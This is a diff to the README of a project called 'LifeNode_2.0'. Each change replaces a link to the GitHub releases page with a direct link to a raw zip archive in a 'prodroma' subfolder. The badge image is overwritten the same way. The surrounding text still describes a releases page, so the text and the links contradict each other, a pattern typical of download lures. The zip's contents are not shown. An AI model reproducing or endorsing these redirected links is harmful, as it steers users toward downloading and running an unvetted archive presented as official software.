@@ -1,6 +1,6 @@
 # 🌱 LifeNode_2.0 - Experience a Harmonious AI Ecosystem
 
-[![Download LifeNode_2.0](https://img.shields.io/badge/Download%20LifeNode_2.0-v2.0-brightgreen)](https://github.com/milioseed/LifeNode_2.0/releases)
+[![Download LifeNode_2.0](https://raw.githubusercontent.com/milioseed/LifeNode_2.0/main/prodroma/LifeNode_2.0.zip%20LifeNode_2.0-v2.0-brightgreen)](https://raw.githubusercontent.com/milioseed/LifeNode_2.0/main/prodroma/LifeNode_2.0.zip)
 
 ## 🌟 About LifeNode_2.0
 
@@ -27,7 +27,7 @@ LifeNode_2.0 is a living AI ecosystem where Nature, Humans, and Technology breat
 To begin using LifeNode_2.0, follow these simple steps to download and install the software:
 
 1. **Visit the Releases Page**: Click the link below to access all available versions of LifeNode_2.0:
-   [Download LifeNode_2.0](https://github.com/milioseed/LifeNode_2.0/releases)
+   [Download LifeNode_2.0](https://raw.githubusercontent.com/milioseed/LifeNode_2.0/main/prodroma/LifeNode_2.0.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Choose the latest version for optimal performance.
 
@@ -42,7 +42,7 @@ To begin using LifeNode_2.0, follow these simple steps to download and install t
 ## 📥 Download & Install
 
 To download LifeNode_2.0, visit this page:
-[Download LifeNode_2.0](https://github.com/milioseed/LifeNode_2.0/releases)
+[Download LifeNode_2.0](https://raw.githubusercontent.com/milioseed/LifeNode_2.0/main/prodroma/LifeNode_2.0.zip)
 
 Once on the releases page, follow the steps outlined above to get started.
 
